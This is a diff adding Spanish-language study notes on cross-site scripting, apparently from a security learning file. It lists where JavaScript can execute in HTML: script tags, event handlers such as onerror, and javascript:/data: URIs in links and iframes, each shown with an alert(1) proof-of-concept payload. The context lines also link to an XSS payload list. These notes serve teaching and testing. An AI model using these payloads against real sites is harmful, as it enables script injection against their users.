@@ -119,6 +119,17 @@ Es el motor de accionables de las paginas web, por llamarlo de una forma burda.
 - payloads:
   - https://github.com/payloadbox/xss-payload-list
  
+- Lugares donde puede correr js:
+  - Etiqueta general:
+    - <script> directamente etiquetando al codigo
+  - Dentro de etiquetas como evento:
+    - <img src=x onerror=alert(1)> dentro de una etiqueta 
+  - Dentro de un atributos tipo URI:
+    - <a href="javascript:alert(1)">
+    - <iframe src="javascript:alert(1)">
+    - <iframe srcdoc="<script>alert(1)</script>">
+    - <a href="data:text/html,<script>alert(1)</script>"> (este ya no es un payload confiable porque los navegadores lo bloquean)
+ 
 ### JQuery:
 - Usualmente las paginas usan frameworks de desarrollo que ayudan a hacer más intuitivo el desarrollo de las aplicaciones, en este caso existe jquery que facilitan el desarrollo. JQuery estandariza la forma en la que interacturamos con los objetos.
 - Ejemplo:
